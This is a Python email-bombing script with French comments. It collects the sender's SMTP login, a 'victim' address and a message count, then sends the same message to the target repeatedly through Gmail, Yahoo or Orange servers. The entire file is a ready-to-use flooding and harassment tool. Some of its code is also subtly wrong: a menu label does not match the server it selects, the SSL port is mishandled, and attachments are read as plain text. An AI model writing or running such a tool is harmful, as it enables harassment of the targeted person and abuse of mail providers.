import smtplib
import getpass
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
import logging

server = input ("Entrez le serveur SMTP que vous souhaitez utiliser ou choisissez l'un de ceux proposés (1:Gmail, 2:Outlook, 3:Orange) \n ") #Choix du serveur SMTP
SrcEmail = input(str('Entrez votre email: '))  #Entrée de l'email de l'utilisateur
SrcMdp = getpass.getpass('Entrez votre mot de passe: ')  #Entréé du mot de passe de l'email
 
 
DestEmail = input('\nEmail de la victime: ')  #Entrée de l'email de la victime
Sujet = input('Sujet: ')  #Entrée de l'objet du mail
Contenu = input('Message: ')  #Entrée du message à envoyer
Joint = input('Souhaitez vous ajouter une piece jointe ? Si oui, veuillez entrer le chemin pour y accéder')  #Ajout d'une potentielle pièce jointe
Nbr_Mails = int(input('Combien de mails voulez vous envoyer ? '))  #Entrée du nombre de mails à envoyer

#Formatage du mail
msg = MIMEMultipart()
msg['Date'] = formatdate(localtime=True)
msg['Subject'] = Sujet
msg['From'] = SrcEmail
msg['To'] = DestEmail

msg.attach(MIMEText(open(Joint).read()))

#Configuration suivant le choix du serveur SMTP
if server == '1':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == '2':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
elif server == '3':
    smtp_server = 'smtp.orange.fr'
    port = 465
else:
    print ('Appliqué à tous les serveurs')
    sys.exit()
 
print ('')

try:
    server = smtplib.SMTP(smtp_server,port)  #initialisation des paramètres
    server.ehlo()  #Prise de contact avec le serveur
    if smtp_server == "smtp.gmail.com": #Si il s'agit d'un serveur gmail
            server.starttls()   #On utilise le protocole TLS
    server.login(SrcEmail,SrcMdp) #Connection au serveur
    
    for i in range(0,Nbr_Mails):  #pour i allant de 0 au nombre de mails à envoyer
        server.sendmail(SrcEmail,DestEmail,msg.as_string())  #Envoie du mail
        i +=1  #incrément de i+1
    print ("\r[+] Nombre d'emails envoyés: %i" % i)  #Décompte des mails envoyés
    sys.stdout.flush()
    server.quit()  #On quitte le serveur
    print ('\n [+] Envoie terminé')
    
    #On créé un fichier de log
    logging.basicConfig(filename='log.log', encoding='utf-8', level=logging.DEBUG)
    logging.info(msg)
    
except KeyboardInterrupt:  #En cas d'interruption clavier
    print ('[-] Annulé')  #On affiche un message d'interruption
    sys.exit()
   
except smtplib.SMTPAuthenticationError:  #Si les informations d'identification au serveur SMTP
    print ('\n[!] Email ou mot de passe incorrect')  #On affiche un message d'erreur adapté
    sys.exit()
